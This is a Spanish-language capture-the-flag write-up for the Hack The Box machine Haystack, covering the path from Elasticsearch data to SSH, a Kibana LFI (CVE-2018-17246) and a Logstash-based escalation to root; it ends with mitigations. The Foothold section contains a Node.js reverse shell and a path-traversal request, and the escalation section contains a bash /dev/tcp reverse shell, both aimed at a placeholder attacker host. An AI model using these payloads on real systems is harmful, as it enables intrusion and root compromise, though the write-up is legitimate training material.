---
machine: Haystack
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, elasticsearch, kibana, logstash, privesc]
---

# Haystack — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La imagen de la web contiene una cadena base64 con la pista «la aguja en el pajar es clave». Elasticsearch en `9200` expone los índices `quotes` y `bank`; en `quotes` hay dos documentos con un usuario y una contraseña en base64. Esas credenciales dan SSH como `security`. Kibana escucha en `localhost:5601` y es vulnerable a CVE-2018-17246: una ruta de API cargada como JavaScript ejecuta un archivo local. La shell es de `kibana`, cuyo grupo puede leer la configuración de Logstash; este corre como root y ejecuta el campo `comando` de un log, lo que permite ejecutar una reverse shell como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,9200 <IP>
```

- `22` OpenSSH 7.4.
- `80` nginx 1.12.2 con una única imagen, `needle.jpg`.
- `9200` Elasticsearch.

```bash
strings -n 20 needle.jpg | tail -1 | base64 -d
# la aguja en el pajar es "clave"
```

El índice `quotes` contiene la pista; `bank` es ruido. La enumeración web no encuentra rutas adicionales.

## Enumeración

```bash
curl -s http://<IP>:9200/_cat/indices?v
curl -s -X GET 'http://<IP>:9200/quotes/_search?size=1000' \
  -H 'Content-Type: application/json' \
  -d '{"query":{"match_all":{}}}' | jq -c '.hits.hits[]'
```

Dos documentos incluyen valores base64 que, al decodificarlos, revelan `user: security` y `pass: <PASSWORD>`. Esas credenciales funcionan por SSH:

```bash
ssh security@<IP>
```

`netstat` no está instalado; `/proc/net/tcp` muestra un listener en `127.0.0.1:5601` (Kibana). Se reenvía el puerto con SSH.

## Foothold

Kibana 6.x es vulnerable a CVE-2018-17246: el parámetro `apis` permite cargar un archivo local como JavaScript. Se escribe una reverse shell de Node en `/dev/shm/0xdf.js` y se solicita la ruta:

```bash
curl -s 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../dev/shm/0xdf.js'
```

La shell se ejecuta como `kibana`:

```javascript
(function(){
  var net = require("net"), cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(443, "<ATTACKER>", function(){
    client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);
  });
  return /a/;
})();
```

## Movimiento lateral

`security` → `kibana` es el único salto. La cuenta `kibana` pertenece al grupo del mismo nombre, que puede leer `/etc/logstash/conf.d/`.

## Escalada de privilegios

Logstash corre como root. Su configuración encadena tres archivos:

- `input.conf` lee `/opt/kibana/logstash_*` cada 10 segundos y marca el evento como `execute`.
- `filter.conf` aplica un `grok` sobre `Ejecutar comando: <texto>` y guarda el resto en `comando`.
- `output.conf` ejecuta `%{comando} &` con el plugin `exec`.

Se escribe una línea válida en el directorio vigilado:

```bash
echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'" \
  > /opt/kibana/logstash_0xdf
```

En unos segundos llega una shell con UID 0.

## Evidencia

- Cadena base64 de `needle.jpg`.
- Índices de Elasticsearch y documentos con usuario/contraseña.
- Acceso SSH como `security`.
- Listener `127.0.0.1:5601` en `/proc/net/tcp`.
- Shell como `kibana` tras cargar el JS.
- Archivos de Logstash y shell root.

## Lecciones aprendidas

- Las pistas visuales y los metadatos de imágenes también son enumeración.
- Elasticsearch sin autenticación expone datos y credenciales de otros servicios.
- Un LFI que carga JavaScript es ejecución de código, no solo lectura de archivos.
- La configuración de un servicio que corre como root puede convertir un log en una shell.

## Mitigaciones y detección

- Proteger Elasticsearch con autenticación y no indexar credenciales.
- Actualizar Kibana y restringir `/api/console/api_server`; no cargar rutas controladas por el usuario.
- Ejecutar Logstash con un usuario sin privilegios y no usar el plugin `exec` sobre campos no confiables.
- Restringir la lectura de `/etc/logstash/conf.d` al servicio.
- Detectar peticiones con `apis=../../`, procesos Node que abren sockets y archivos `logstash_*` creados fuera del flujo normal.

## Referencias

- [0xdf — Haystack](https://0xdf.gitlab.io/2019/11/02/htb-haystack.html)
- [IppSec — Haystack](https://www.youtube.com/watch?v=oGO9MEIz_tI)
- [NVD — CVE-2018-17246](https://nvd.nist.gov/vuln/detail/CVE-2018-17246)
- [Hack The Box — Haystack](https://app.hackthebox.com/machines/haystack)
